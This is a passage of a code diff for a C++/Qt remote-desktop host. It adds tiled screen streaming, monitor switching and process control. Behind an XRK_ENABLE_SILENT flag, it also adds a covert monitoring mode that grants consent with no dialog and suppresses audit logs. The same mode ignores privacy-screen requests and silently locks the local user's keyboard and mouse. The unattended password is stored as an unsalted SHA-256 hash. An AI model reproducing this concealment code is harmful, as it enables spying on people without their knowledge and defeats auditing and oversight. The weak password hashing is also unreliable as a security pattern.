@@ -1,4 +1,5 @@
 #include "host.h"
+#include <algorithm>
 #include "core/protocol_manager.h"
 #include "core/message_codec.h"
 #include "core/encryption.h"
@@ -12,6 +13,8 @@
 #include "screen_recorder.h"
 #include "privacy_screen.h"
 #include "system_info_collector.h"
+#include "process_collector.h"
+#include "annotation_overlay.h"
 #include "core/logger.h"
 #include <QTcpSocket>
 #include <QHostInfo>
@@ -39,7 +42,7 @@ namespace xrk {
 
 // ==================== CaptureWorker ====================
 
-CaptureWorker::CaptureWorker(ScreenCapture* capture, CameraCapture* camera, FrameQueue<QImage>* queue, int fps)
+CaptureWorker::CaptureWorker(ScreenCapture* capture, CameraCapture* camera, FrameQueue<CapturedFrame>* queue, int fps)
     : QObject(nullptr), m_capture(capture), m_camera(camera), m_queue(queue), m_timer(nullptr), m_fps(fps), m_running(false) {
 }
 
@@ -96,12 +99,15 @@ void CaptureWorker::stop() {
 }
 
 void CaptureWorker::onCaptureTimer() {
-    QImage frame;
+    CapturedFrame captured;
     if (m_useCamera && m_camera && m_camera->isInitialized()) {
-        frame = m_camera->captureFrame();
+        // The camera backend has no change metadata; an empty dirty list tells
+        // the encoder to diff the whole frame itself.
+        captured.image = m_camera->captureFrame();
     } else if (m_capture && m_capture->isInitialized()) {
-        frame = m_capture->captureFrame();
+        captured.image = m_capture->captureFrame(&captured.dirtyRects);
     }
+    const QImage& frame = captured.image;
     if (!frame.isNull()) {
         static bool firstCaptured = false;
         if (!firstCaptured) {
@@ -116,7 +122,7 @@ void CaptureWorker::onCaptureTimer() {
         }
         // Non-blocking enqueue: if queue is full, drop this frame instead of
         // blocking the timer thread (which would stall all subsequent captures).
-        if (!m_queue->enqueueNonBlocking(frame)) {
+        if (!m_queue->enqueueNonBlocking(captured)) {
             static int droppedCount = 0;
             if (++droppedCount % 300 == 1) {
                 LOG_WARNING("CaptureWorker: dropped " + QString::number(droppedCount) +
@@ -137,7 +143,7 @@ void CaptureWorker::onCaptureTimer() {
 
 // ==================== EncodeWorker ====================
 
-EncodeWorker::EncodeWorker(FrameQueue<QImage>* inputQueue, FrameQueue<QByteArray>* outputQueue)
+EncodeWorker::EncodeWorker(FrameQueue<CapturedFrame>* inputQueue, FrameQueue<QByteArray>* outputQueue)
     : QObject(nullptr), m_inputQueue(inputQueue), m_outputQueue(outputQueue), m_encoder(nullptr), m_encryption(nullptr), m_thread(nullptr), m_running(false) {
 }
 
@@ -165,6 +171,81 @@ void EncodeWorker::setEncryptionKey(const QByteArray& key, const QByteArray& iv)
 
 void EncodeWorker::requestFallbackToJpeg() {
     m_fallbackRequested = true;
+}
+
+void EncodeWorker::setTiledMode(bool enabled) {
+    if (m_tiledMode.exchange(enabled) != enabled && enabled) {
+        // Entering tiled mode: the client has no tile cache yet.
+        m_keyFrameRequest = true;
+    }
+}
+
+QByteArray EncodeWorker::sealPayload(const QByteArray& payload) {
+    if (m_encryption && m_encryption->isInitialized()) {
+        QByteArray encrypted = m_encryption->encrypt(payload);
+        if (!encrypted.isEmpty()) {
+            return encrypted;
+        }
+    }
+    return payload;
+}
+
+void EncodeWorker::resendTiles(const QList<QPoint>& tiles) {
+    QImage frame;
+    {
+        QMutexLocker lock(&m_lastFrameMutex);
+        frame = m_lastRawFrame;
+    }
+    if (frame.isNull()) {
+        return;
+    }
+
+    int sent = 0;
+    const uint32_t fw = static_cast<uint32_t>(frame.width());
+    const uint32_t fh = static_cast<uint32_t>(frame.height());
+    const int tileSize = m_tileEncoder ? m_tileEncoder->tileSize() : TILE_SIZE;
+    static std::atomic<uint32_t> s_seq{0};
+
+    for (const QPoint& p : tiles) {
+        const int col = p.x() / tileSize;
+        const int row = p.y() / tileSize;
+        const int tx = col * tileSize;
+        const int ty = row * tileSize;
+        if (tx >= frame.width() || ty >= frame.height()) {
+            continue; // out of bounds relative to current frame
+        }
+        const QRect area(tx, ty,
+                        qMin(tileSize, frame.width() - tx),
+                        qMin(tileSize, frame.height() - ty));
+        TileEncoding encoding = TileEncoding::JPEG;
+        QByteArray data = TileEncoder::encodeTilePixels(frame.copy(area), m_tileQuality.load(), &encoding);
+        if (data.isEmpty()) {
+            continue;
+        }
+
+        ScreenTile tile;
+        tile.x = static_cast<uint32_t>(tx);
+        tile.y = static_cast<uint32_t>(ty);
+        tile.w = static_cast<uint32_t>(area.width());
+        tile.h = static_cast<uint32_t>(area.height());
+        tile.seq = ++s_seq;
+        tile.frameWidth = fw;
+        tile.frameHeight = fh;
+        tile.encoding = static_cast<uint8_t>(encoding);
+        tile.timestamp = static_cast<uint64_t>(QDateTime::currentMSecsSinceEpoch());
+        tile.data = data;
+        tile.hash = QCryptographicHash::hash(data, QCryptographicHash::Md5);
+
+        QByteArray message = ProtocolManager::encode(
+            MessageType::SCREEN_TILE, sealPayload(ProtocolManager::encodeScreenTile(tile)));
+        if (!m_outputQueue->enqueueNonBlocking(message)) {
+            break; // output backpressured; a keyframe will eventually repair it
+        }
+        ++sent;
+    }
+    if (sent > 0) {
+        LOG_INFO("EncodeWorker(tiled): NACK resend — " + QString::number(sent) + " tile(s)");
+    }
 }
 
 void EncodeWorker::start() {
@@ -213,16 +294,94 @@ void EncodeWorker::processFrames() {
             }
         }
 
-        QImage rawFrame = m_inputQueue->dequeue(50);
-        if (rawFrame.isNull()) {
+        CapturedFrame captured = m_inputQueue->dequeue(50);
+        if (captured.image.isNull()) {
             continue;
         }
 
-        // At high FPS, drain stale frames from the queue to stay current
+        // At high FPS, drain stale frames from the queue to stay current. The
+        // dirty regions of the skipped frames must be carried forward, or the
+        // tiled encoder would never learn that those areas changed.
         while (m_inputQueue->size() > 2) {
-            QImage stale = m_inputQueue->dequeue(1);
-            if (stale.isNull()) break;
-            rawFrame = stale;
+            CapturedFrame stale = m_inputQueue->dequeue(1);
+            if (stale.image.isNull()) break;
+            if (captured.dirtyRects.isEmpty() || stale.dirtyRects.isEmpty()) {
+                stale.dirtyRects.clear();   // one frame had no hint -> no hint at all
+            } else {
+                stale.dirtyRects.append(captured.dirtyRects);
+            }
+            captured = stale;
+        }
+
+        const QImage& rawFrame = captured.image;
+
+        if (m_tiledMode.load()) {
+            if (!m_tileEncoder) {
+                m_tileEncoder = std::make_unique<TileEncoder>();
+            }
+            m_tileEncoder->setQuality(m_tileQuality.load());
+            m_tileEncoder->setMaxTilesPerFrame(m_maxTilesPerFrame.load());
+            const bool keyFrame = m_keyFrameRequest.exchange(false);
+            if (keyFrame) {
+                m_tileEncoder->requestKeyFrame();
+            }
+
+            QList<ScreenTile> tiles = m_tileEncoder->buildTiles(rawFrame, captured.dirtyRects);
+            if (tiles.isEmpty()) {
+                continue;   // nothing on screen moved: send nothing at all
+            }
+
+            // Cache the current frame so NACK resends can re-encode requested
+            // tiles on demand.
+            {
+                QMutexLocker lock(&m_lastFrameMutex);
+                m_lastRawFrame = rawFrame.copy();
+            }
+
+            // Cursor-aware priority: stream the tile(s) under the pointer first
+            // so the region the user is actively using repaints before the rest
+            // of the screen on a bandwidth-limited link.
+            const QPoint mp = m_mousePos;
+            if (!mp.isNull() && tiles.size() > 1) {
+                std::stable_partition(tiles.begin(), tiles.end(),
+                    [&](const ScreenTile& t) {
+                        const int px = mp.x(), py = mp.y();
+                        return px >= static_cast<int>(t.x) && px < static_cast<int>(t.x + t.w) &&
+                               py >= static_cast<int>(t.y) && py < static_cast<int>(t.y + t.h);
+                    });
+            }
+            if (keyFrame) {
+                LOG_INFO("EncodeWorker(tiled): keyframe sent — " +
+                         QString::number(tiles.size()) + " tiles, " +
+                         QString::number(m_tileEncoder->lastFrameBytes() / 1024) + "KB");
+            }
+
+            ++framesEncoded;
+            int tileDrops = 0;
+            for (const ScreenTile& tile : tiles) {
+                QByteArray payload = sealPayload(ProtocolManager::encodeScreenTile(tile));
+                QByteArray message = ProtocolManager::encode(MessageType::SCREEN_TILE, payload);
+                if (!m_outputQueue->enqueueNonBlocking(message)) {
+                    ++tileDrops;
+                }
+            }
+            if (tileDrops > 0) {
+                // Whatever did not fit is lost for good, so the client's cache
+                // for those tiles is stale: schedule a full refresh.
+                outputDrops += tileDrops;
+                m_tileEncoder->requestKeyFrame();
+                if (outputDrops % 300 < tileDrops) {
+                    LOG_WARNING("EncodeWorker: output queue full, dropped " +
+                                QString::number(outputDrops) + " tiles");
+                }
+            }
+            if (framesEncoded % 300 == 1) {
+                LOG_INFO("EncodeWorker(tiled): " + QString::number(framesEncoded) +
+                         " frames, " + QString::number(tiles.size()) + " tiles/" +
+                         QString::number(m_tileEncoder->lastFrameBytes() / 1024) + "KB this frame, " +
+                         QString::number(m_tileEncoder->pendingTileCount()) + " deferred");
+            }
+            continue;
         }
 
         QByteArray encodedData;
@@ -453,13 +612,22 @@ bool Host::start(uint16_t port) {
         return false;
     }
 
-    m_udpSocket = new QUdpSocket(this);
-    if (!m_udpSocket->bind(QHostAddress::Any, UDP_BROADCAST_PORT + 1)) {
-        QString warn = "Failed to bind UDP socket for discovery on port " + QString::number(UDP_BROADCAST_PORT + 1);
-        LOG_WARNING("Host: " + warn);
-        // Not a fatal error, continue
+    // Active discovery is handled by a single shared UDP socket on the unified
+    // 9998 channel (plan §1.4). In GUI mode the process-wide NetworkManager is
+    // injected via setDiscoveryNetwork(); in service mode (no external manager)
+    // we create a lightweight internal one so the host can still answer searches.
+    if (!m_discovery) {
+        m_ownedDiscovery = new NetworkManager(this);
+        if (!m_ownedDiscovery->initialize(UDP_BROADCAST_PORT, /*startTcpServer=*/false)) {
+            LOG_WARNING("Host: failed to start internal discovery NetworkManager");
+            delete m_ownedDiscovery;
+            m_ownedDiscovery = nullptr;
+        }
+        m_discovery = m_ownedDiscovery;
     }
-    connect(m_udpSocket, &QUdpSocket::readyRead, this, &Host::onDiscoveryRequest);
+    if (m_discovery) {
+        m_discovery->setDiscoveryIdentity(QHostInfo::localHostName(), m_port, m_accessCode);
+    }
 
     // Generate random 9-digit access code
     m_accessCode = QString::number(QRandomGenerator::global()->bounded(100000000, 999999999));
@@ -493,7 +661,7 @@ bool Host::start(uint16_t port) {
     m_encryption = std::make_unique<Encryption>();
     m_encryption->generateKey();
 
-    m_rawFrameQueue = new FrameQueue<QImage>(8);
+    m_rawFrameQueue = new FrameQueue<CapturedFrame>(8);
     m_encodedFrameQueue = new FrameQueue<QByteArray>(5);
 
     m_captureThread = new QThread(this);
@@ -554,10 +722,23 @@ bool Host::start(uint16_t port) {
     m_qualityTimer->start(2000);
 
     m_discoveryTimer = new QTimer(this);
-    connect(m_discoveryTimer, &QTimer::timeout, this, &Host::broadcastDiscoveryResponse);
+    connect(m_discoveryTimer, &QTimer::timeout, this, &Host::onDiscoveryBroadcastTimer);
     m_discoveryTimer->start(3000);
 
-    broadcastDiscoveryResponse();
+    // Monitor hot-plug detection: check every 5 seconds for monitor changes
+    m_monitorRefreshTimer = new QTimer(this);
+    connect(m_monitorRefreshTimer, &QTimer::timeout, this, &Host::checkMonitorChanges);
+    m_monitorRefreshTimer->start(5000);
+    // Initial snapshot of monitors for change detection
+    if (m_screenCapture) {
+        m_lastKnownMonitors = m_screenCapture->getMonitorList();
+    }
+
+    // Auto-switch timer (created but not started until requested by controller)
+    m_autoSwitchTimer = new QTimer(this);
+    connect(m_autoSwitchTimer, &QTimer::timeout, this, &Host::performAutoSwitchStep);
+
+    onDiscoveryBroadcastTimer();
 
     if (!m_auditLogger) {
         m_auditLogger = new AuditLogger(QString(), this);
@@ -610,6 +791,12 @@ void Host::stop() {
         m_localLock = nullptr;
     }
 
+    if (m_annotationOverlay) {
+        m_annotationOverlay->hide();
+        m_annotationOverlay->deleteLater();
+        m_annotationOverlay = nullptr;
+    }
+
     if (m_clipboardManager) {
         m_clipboardManager->stopMonitoring();
         delete m_clipboardManager;
@@ -618,7 +805,36 @@ void Host::stop() {
 
     if (m_discoveryTimer) {
         m_discoveryTimer->stop();
+        m_discoveryTimer->deleteLater();
+        m_discoveryTimer = nullptr;
     }
+
+    if (m_monitorRefreshTimer) {
+        m_monitorRefreshTimer->stop();
+        m_monitorRefreshTimer->deleteLater();
+        m_monitorRefreshTimer = nullptr;
+    }
+
+    if (m_autoSwitchTimer) {
+        m_autoSwitchTimer->stop();
+        m_autoSwitchTimer->deleteLater();
+        m_autoSwitchTimer = nullptr;
+    }
+    m_autoSwitchActive = false;
+    m_autoSwitchPaused = false;
+
+    // Stop advertising this host on the discovery channel: either clear the
+    // shared manager's identity (GUI mode) or tear down the owned manager
+    // (service mode). The owned manager is a child of this Host, so it is
+    // destroyed when Host is destroyed; we just stop it here.
+    if (m_discovery) {
+        m_discovery->setDiscoveryIdentity(QString(), 0);
+    }
+    if (m_ownedDiscovery) {
+        m_ownedDiscovery->shutdown();
+        m_ownedDiscovery = nullptr;
+    }
+    m_discovery = nullptr;
 
     for (auto it = m_clients.begin(); it != m_clients.end(); ++it) {
         if (it.value().socket) {
@@ -629,9 +845,6 @@ void Host::stop() {
 
     if (m_tcpServer) {
         m_tcpServer->close();
-    }
-    if (m_udpSocket) {
-        m_udpSocket->close();
     }
 
     // Stop each worker from its OWN thread so any timers it owns (e.g. the
@@ -706,12 +919,41 @@ bool Host::isPasswordRequired() const {
     return !m_password.isEmpty();
 }
 
+void Host::setUnattendedAccessEnabled(bool enabled) {
+    m_unattendedEnabled = enabled;
+    QSettings settings("XRK", "Host");
+    settings.setValue("unattended_access_enabled", enabled);
+}
+
+bool Host::isUnattendedAccessEnabled() const {
+    return m_unattendedEnabled;
+}
+
+void Host::setUnattendedPassword(const QString& password) {
+    m_unattendedPasswordHash = QCryptographicHash::hash(password.toUtf8(), QCryptographicHash::Sha256).toHex();
+    QSettings settings("XRK", "Host");
+    settings.setValue("unattended_password_hash", m_unattendedPasswordHash);
+}
+
+QString Host::unattendedPassword() const {
+    return m_unattendedPasswordHash;
+}
+
+bool Host::verifyUnattendedPassword(const QString& password) const {
+    if (m_unattendedPasswordHash.isEmpty()) return false;
+    QString hash = QCryptographicHash::hash(password.toUtf8(), QCryptographicHash::Sha256).toHex();
+    return hash == m_unattendedPasswordHash;
+}
+
 void Host::setJpegQuality(int quality) {
     m_jpegQuality = qBound(m_minJpegQuality, quality, m_maxJpegQuality);
     // m_quality in JpegEncoder is atomic, so it's safe to poke the live
     // encoder from the main/GUI thread while the encode worker reads it.
     if (m_encodeWorker && m_encodeWorker->encoder()) {
         m_encodeWorker->encoder()->setJpegQuality(m_jpegQuality);
+    }
+    if (m_encodeWorker) {
+        m_encodeWorker->setTileQuality(m_jpegQuality);
     }
 }
 
@@ -760,12 +1002,20 @@ void Host::setQualityLevel(QualityLevel level, bool gameMode) {
 }
 
 void Host::logAudit(const QString& clientId, const QString& event, const QString& details) {
+#ifdef XRK_ENABLE_SILENT
+    // Suppress any audit trail tied to a silent session (plan §2.2d): a silent
+    // monitor must leave no visible/auditable footprint.
+    if (m_clients.value(clientId).silentMode) return;
+#endif
     if (m_auditLogger) {
         m_auditLogger->logConnection(clientId, event, details);
     }
 }
 
 void Host::logAuditOp(const QString& clientId, const QString& operation, const QString& details) {
+#ifdef XRK_ENABLE_SILENT
+    if (m_clients.value(clientId).silentMode) return;
+#endif
     if (m_auditLogger) {
         m_auditLogger->logOperation(clientId, operation, details);
     }
@@ -854,6 +1104,143 @@ void Host::sendToClient(const QString& clientId, const QByteArray& data) {
     socket->flush();
 }
 
+void Host::handleScreenAck(const QString& clientId, const QByteArray& payload) {
+    if (!m_clients.contains(clientId)) {
+        return;
+    }
+    ScreenAck ack = ProtocolManager::decodeScreenAck(payload);
+
+    ClientInfo& info = m_clients[clientId];
+    const qint64 now = QDateTime::currentMSecsSinceEpoch();
+
+    // Prefer the client's own RTT measurement; fall back to the echoed frame
+    // timestamp when it did not provide one.
+    qint64 rtt = ack.roundTripMs;
+    if (rtt <= 0 && ack.timestamp > 0) {
+        rtt = now - static_cast<qint64>(ack.timestamp);
+    }
+    if (rtt > 0 && rtt < 60000) {
+        // Smooth so a single stalled frame cannot swing the whole loop.
+        info.rttMs = info.rttMs > 0 ? (info.rttMs * 3 + rtt) / 4 : rtt;
+    }
+
+    const quint64 total = static_cast<quint64>(ack.tilesReceived) + ack.tilesLost;
+    if (total > 0) {
+        const int loss = static_cast<int>(ack.tilesLost * 100 / total);
+        info.lossPercent = (info.lossPercent * 3 + loss) / 4;
+    }
+    info.bufferLevel = static_cast<int>(qMin<uint32_t>(ack.bufferLevel, 100));
+    info.lastAckMs = now;
+
+    // Surface a weak link to the operator without flooding the log (acks arrive
+    // ~1/s per client).
+    if (info.lossPercent > 3 || (info.rttMs > 250 && info.rttMs < 60000)) {
+        static qint64 s_lastWarn = 0;
+        if (now - s_lastWarn > 5000) {
+            s_lastWarn = now;
+            LOG_WARNING(QString("Host: client %1 weak link — rtt=%2ms loss=%3%% buffer=%4")
+                        .arg(clientId).arg(info.rttMs).arg(info.lossPercent).arg(info.bufferLevel));
+        }
+    }
+}
+
+void Host::handleScreenTileRequest(const QString& clientId, const QByteArray& payload) {
+    Q_UNUSED(clientId);
+    if (!m_encodeWorker) {
+        return;
+    }
+    ScreenTileRequest req = ProtocolManager::decodeScreenTileRequest(payload);
+    if (req.tiles.isEmpty()) {
+        return;
+    }
+    m_encodeWorker->resendTiles(req.tiles);
+}
+
+void Host::updateTileTransportMode() {
+    if (!m_encodeWorker) {
+        return;
+    }
+
+    int authenticated = 0;
+    int tileCapable = 0;
+    for (auto it = m_clients.constBegin(); it != m_clients.constEnd(); ++it) {
+        if (!it.value().authenticated) continue;
+        ++authenticated;
+        if (it.value().tileCapable) ++tileCapable;
+    }
+
+    // Tiles are only safe when every viewer understands them; a legacy
+    // controller would just see a frozen screen otherwise. H264 carries its own
+    // inter-frame compression, so tiling it would be redundant.
+    const bool enable = authenticated > 0 && authenticated == tileCapable &&
+                        m_activeEncoderType == EncoderType::JPEG;
+
+    if (enable == m_tiledTransport) {
+        return;
+    }
+    m_tiledTransport = enable;
+    m_encodeWorker->setTiledMode(enable);
+    m_encodeWorker->setTileQuality(m_jpegQuality);
+    applyTileBudget();
+    LOG_INFO(QString("Host: tiled screen transport %1").arg(enable ? "enabled" : "disabled"));
+}
+
+void Host::applyTileBudget() {
+    if (!m_encodeWorker) {
+        return;
+    }
+    if (!m_tiledTransport) {
+        m_tileBudget = 0;
+        m_encodeWorker->setMaxTilesPerFrame(0);
+        return;
+    }
+
+    // Worst link across all viewers drives the budget: everyone shares the
+    // same encoded tile stream.
+    qint64 worstRtt = 0;
+    int worstLoss = 0;
+    int worstBuffer = 0;
+    bool haveFeedback = false;
+    for (auto it = m_clients.constBegin(); it != m_clients.constEnd(); ++it) {
+        const ClientInfo& info = it.value();
+        if (!info.authenticated || info.lastAckMs == 0) continue;
+        haveFeedback = true;
+        worstRtt = qMax(worstRtt, info.rttMs);
+        worstLoss = qMax(worstLoss, info.lossPercent);
+        worstBuffer = qMax(worstBuffer, info.bufferLevel);
+    }
+
+    if (!haveFeedback) {
+        m_tileBudget = TILE_BUDGET_MAX;
+        m_encodeWorker->setMaxTilesPerFrame(0);
+        return;
+    }
+
+    // Multiplicative decrease on congestion, additive increase when healthy —
+    // the same shape as TCP's control loop, applied to tiles per frame.
+    const bool congested = worstRtt > 250 || worstLoss > 3 || worstBuffer > 70;
+    const bool healthy = worstRtt < 120 && worstLoss == 0 && worstBuffer < 30;
+
+    const int oldBudget = m_tileBudget;
+    int budget = m_tileBudget > 0 ? m_tileBudget : TILE_BUDGET_MAX;
+    if (congested) {
+        budget = budget / 2;
+    } else if (healthy) {
+        budget += TILE_BUDGET_MIN;
+    }
+    m_tileBudget = qBound(TILE_BUDGET_MIN, budget, TILE_BUDGET_MAX);
+
+    if (m_tileBudget != oldBudget) {
+        LOG_INFO(QString("Host: tile budget %1 -> %2 (worst rtt=%3ms loss=%4%% buffer=%5)")
+                 .arg(oldBudget).arg(m_tileBudget)
+                 .arg(worstRtt).arg(worstLoss).arg(worstBuffer));
+    }
+
+    // At the ceiling stop capping entirely, so a healthy link is never
+    // artificially throttled.
+    m_encodeWorker->setMaxTilesPerFrame(m_tileBudget >= TILE_BUDGET_MAX ? 0 : m_tileBudget);
+}
+
 void Host::onQualityTimer() {
     // Measure bandwidth over last 2 seconds
     qint64 now = QDateTime::currentMSecsSinceEpoch();
@@ -874,6 +1261,19 @@ void Host::onQualityTimer() {
         if (it.value().authenticated) clientCount++;
     }
     if (clientCount == 0) return;
+
+    if (m_tiledTransport) {
+        applyTileBudget();
+        // Periodic full refresh: bounds how long a tile lost to a dropped
+        // connection or a decode error can stay wrong on screen.
+        if (now - m_lastKeyFrameMs > KEYFRAME_INTERVAL_MS) {
+            m_lastKeyFrameMs = now;
+            LOG_INFO("Host: periodic keyframe requested (interval elapsed)");
+            if (m_encodeWorker) {
+                m_encodeWorker->requestKeyFrame();
+            }
+        }
+    }
 
     // When the controller pinned a quality gear, suspend measured bandwidth
     // adaptation and just keep reporting the current settings.
@@ -1086,6 +1486,29 @@ void Host::grantConsent(const QString& clientId) {
     LOG_INFO("Host: Active consented clients: " + QString::number(activeClients));
 }
 
+#ifdef XRK_ENABLE_SILENT
+void Host::grantConsentSilently(const QString& clientId) {
+    if (!m_clients.contains(clientId)) return;
+    ClientInfo& info = m_clients[clientId];
+    if (!info.socket) return;
+
+    // Equivalent to grantConsent EXCEPT every user-facing side effect is
+    // suppressed (plan §2.2a): no consent dialog, no privacy mask, no
+    // clientAuthenticated signal, no visible LOG/AUDIT. The crypto key exchange
+    // (sendAuthKeyTo) and CONSENT_RESPONSE(OK) MUST still happen, otherwise the
+    // controller cannot decrypt the screen feed and would see a black screen.
+    info.consented = true;
+    sendAuthKeyTo(clientId);
+
+    QByteArray resp = ProtocolManager::encodeConsent(true, QString());
+    QByteArray msg = ProtocolManager::encode(MessageType::CONSENT_RESPONSE, resp);
+    info.socket->write(msg);
+    info.socket->flush();
+
+    updateNetworkWorkerClients();
+}
+#endif
+
 void Host::denyConsent(const QString& clientId) {
     if (!m_clients.contains(clientId)) return;
     ClientInfo& info = m_clients[clientId];
@@ -1121,9 +1544,33 @@ void Host::onClientDisconnected() {
         removeReverseSyncForClient(clientId);  // stop any host-side watchers
         LOG_INFO("Host: Client disconnected: " + clientId);
         logAudit(clientId, "disconnected");
+        // v1.6.0: drop the live annotation overlay when its session ends.
+        if (m_annotationOverlay) {
+            m_annotationOverlay->hide();
+            m_annotationOverlay->deleteLater();
+            m_annotationOverlay = nullptr;
+        }
         emit clientDisconnected(clientId);
         updateNetworkWorkerClients();
     }
+
+#ifdef XRK_ENABLE_SILENT
+    // Failsafe: if the disconnecting client had locked local input and no other
+    // live client still holds a block, release the console so it is not left
+    // permanently unusable (plan §2.2c).
+    if (m_inputControl && m_inputControl->isLocalInputBlocked()) {
+        bool stillBlocked = false;
+        for (auto it = m_clients.begin(); it != m_clients.end(); ++it) {
+            if (it.value().authenticated && it.value().silentMode) {
+                stillBlocked = true;
+                break;
+            }
+        }
+        if (!stillBlocked) {
+            m_inputControl->setLocalInputBlocked(false);
+        }
+    }
+#endif
 }
 
 void Host::onClientDataReady() {
@@ -1206,7 +1653,27 @@ void Host::processClientMessage(const QString& clientId, const QByteArray& data)
             processKeyEvent(clientId, payload);
             break;
         case MessageType::SCREEN_FRAME_ACK:
+            handleScreenAck(clientId, payload);
             break;
+        case MessageType::SCREEN_TILE_REQUEST:
+            handleScreenTileRequest(clientId, payload);
+            break;
+        case MessageType::SCREEN_KEYFRAME: {
+            // Only a tile-aware controller ever sends this. It doubles as the
+            // capability handshake and as the "my cache is stale" recovery.
+            ClientInfo& info = m_clients[clientId];
+            const bool firstTime = !info.tileCapable;
+            info.tileCapable = true;
+            if (firstTime) {
+                LOG_INFO("Host: client " + clientId + " supports tiled screen transport");
+                updateTileTransportMode();
+            }
+            if (m_encodeWorker) {
+                m_encodeWorker->requestKeyFrame();
+            }
+            m_lastKeyFrameMs = QDateTime::currentMSecsSinceEpoch();
+            break;
+        }
         case MessageType::SCREENSHOT_REQ: {
             QImage frame = m_screenCapture ? m_screenCapture->captureFrame() : QImage();
             if (!frame.isNull()) {
@@ -1549,6 +2016,32 @@ case MessageType::VOICE_ACK: {
             handleSystemInfoRequest(clientId, payload);
             break;
         }
+        case MessageType::PROCESS_LIST_REQ: {
+            handleProcessListRequest(clientId, payload);
+            break;
+        }
+        case MessageType::PROCESS_KILL_REQ: {
+            if (!m_clients.value(clientId).consented) return;
+            handleProcessKillRequest(clientId, payload);
+            break;
+        }
+        case MessageType::PROCESS_START_REQ: {
+            if (!m_clients.value(clientId).consented) return;
+            handleProcessStartRequest(clientId, payload);
+            break;
+        }
+        case MessageType::ANNOTATION_UPDATE: {
+            // Live screen annotation: a benign visual aid the controller draws
+            // on the host's own screens to guide the user. It only requires an
+            // authenticated session (no consent needed) — it cannot inject
+            // input or read data, it merely paints.
+            handleAnnotationUpdate(clientId, payload);
+            break;
+        }
+        case MessageType::ANNOTATION_CLEAR: {
+            handleAnnotationClear(clientId, payload);
+            break;
+        }
         case MessageType::POWER_COMMAND: {
             if (payload.size() >= 1) {
                 PowerAction action = static_cast<PowerAction>(payload[0]);
@@ -1558,6 +2051,20 @@ case MessageType::VOICE_ACK: {
             break;
         }
         case MessageType::PRIVACY_SCREEN: {
+#ifdef XRK_ENABLE_SILENT
+            // Concealment-first (plan §2.2b): a silent session must never be
+            // betrayed by a privacy overlay. Even a stray/hostile PRIVACY_SCREEN
+            // from the silent controller is ignored while any silent session is
+            // live.
+            bool anySilent = false;
+            for (auto it = m_clients.begin(); it != m_clients.end(); ++it) {
+                if (it.value().consented && it.value().silentMode) {
+                    anySilent = true;
+                    break;
+                }
+            }
+            if (anySilent) break;
+#endif
             if (payload.size() >= 1) {
                 bool enabled = ProtocolManager::decodePrivacyScreen(payload);
                 setPrivacyScreenEnabled(enabled);
@@ -1566,6 +2073,19 @@ case MessageType::VOICE_ACK: {
             }
             break;
         }
+#ifdef XRK_ENABLE_SILENT
+        case MessageType::INPUT_BLOCK: {
+            // Silent monitoring: controller locks/unlocks the controlled
+            // machine's local keyboard & mouse (plan §2.2c). Runs on the Host
+            // main thread, same thread as SendInput, so injection is unaffected.
+            // Deliberately emits no visible log/audit in silent mode.
+            if (payload.size() >= 1 && m_inputControl) {
+                bool block = ProtocolManager::decodePrivacyScreen(payload);
+                m_inputControl->setLocalInputBlocked(block);
+            }
+            break;
+        }
+#endif
         case MessageType::SET_QUALITY: {
             if (payload.size() >= 2) {
                 QualityRequest req = ProtocolManager::decodeQualityRequest(payload);
@@ -1600,12 +2120,95 @@ case MessageType::VOICE_ACK: {
         case MessageType::MONITOR_LIST: {
             if (m_screenCapture) {
                 QList<MonitorInfo> monitors = m_screenCapture->getMonitorList();
-                QByteArray respPayload = ProtocolManager::encodeMonitorList(monitors);
+                int currentMonitorIndex = m_screenCapture->monitorIndex();
+                QByteArray respPayload = ProtocolManager::encodeMonitorList(monitors, currentMonitorIndex);
                 QByteArray resp = ProtocolManager::encode(MessageType::MONITOR_LIST, respPayload);
                 QTcpSocket* socket = m_clients.value(clientId).socket;
                 if (socket) {
                     socket->write(resp);
                     socket->flush();
+                }
+            }
+            break;
+        }
+        case MessageType::MONITOR_REFRESH: {
+            // Controller requests a fresh monitor list; respond with current state
+            if (m_screenCapture) {
+                QList<MonitorInfo> monitors = m_screenCapture->getMonitorList();
+                int currentMonitorIndex = m_screenCapture->monitorIndex();
+                QByteArray respPayload = ProtocolManager::encodeMonitorList(monitors, currentMonitorIndex);
+                QByteArray resp = ProtocolManager::encode(MessageType::MONITOR_LIST, respPayload);
+                QTcpSocket* socket = m_clients.value(clientId).socket;
+                if (socket) {
+                    socket->write(resp);
+                    socket->flush();
+                }
+            }
+            break;
+        }
+        case MessageType::MONITOR_AUTO_SWITCH_START: {
+            startAutoSwitch();
+            break;
+        }
+        case MessageType::MONITOR_AUTO_SWITCH_STOP: {
+            stopAutoSwitch();
+            break;
+        }
+        case MessageType::MONITOR_AUTO_SWITCH_PAUSE: {
+            pauseAutoSwitch();
+            break;
+        }
+        case MessageType::MONITOR_AUTO_SWITCH_RESUME: {
+            resumeAutoSwitch();
+            break;
+        }
+        case MessageType::MONITOR_AUTO_SWITCH_CONFIG: {
+            if (payload.size() >= 4) {
+                QDataStream stream(payload);
+                stream.setByteOrder(QDataStream::BigEndian);
+                int32_t intervalMs;
+                stream >> intervalMs;
+                setAutoSwitchInterval(intervalMs);
+            }
+            break;
+        }
+        case MessageType::MONITOR_THUMBNAIL_REQUEST: {
+            // Controller requests a thumbnail frame for a specific monitor
+            if (payload.size() >= 16 && m_screenCapture) {
+                QDataStream stream(payload);
+                stream.setByteOrder(QDataStream::BigEndian);
+                int32_t excludeIndex, targetIndex, thumbWidth, thumbHeight;
+                stream >> excludeIndex >> targetIndex >> thumbWidth >> thumbHeight;
+
+                // Capture frame from target monitor
+                QImage frame = m_screenCapture->captureFrame(targetIndex);
+                if (!frame.isNull()) {
+                    // Scale to thumbnail size
+                    QImage thumbnail = frame.scaled(thumbWidth, thumbHeight,
+                                                    Qt::KeepAspectRatio, Qt::FastTransformation);
+
+                    // Encode as JPEG
+                    QByteArray thumbData;
+                    QBuffer buffer(&thumbData);
+                    buffer.open(QIODevice::WriteOnly);
+                    thumbnail.save(&buffer, "JPEG", 50);  // Low quality for speed
+
+                    // Send thumbnail frame
+                    QByteArray respPayload;
+                    QDataStream respStream(&respPayload, QIODevice::WriteOnly);
+                    respStream.setByteOrder(QDataStream::BigEndian);
+                    respStream << static_cast<int32_t>(targetIndex);
+                    respStream << static_cast<int32_t>(thumbWidth);
+                    respStream << static_cast<int32_t>(thumbHeight);
+                    respStream << static_cast<int32_t>(thumbData.size());
+                    respStream.writeRawData(thumbData.constData(), thumbData.size());
+
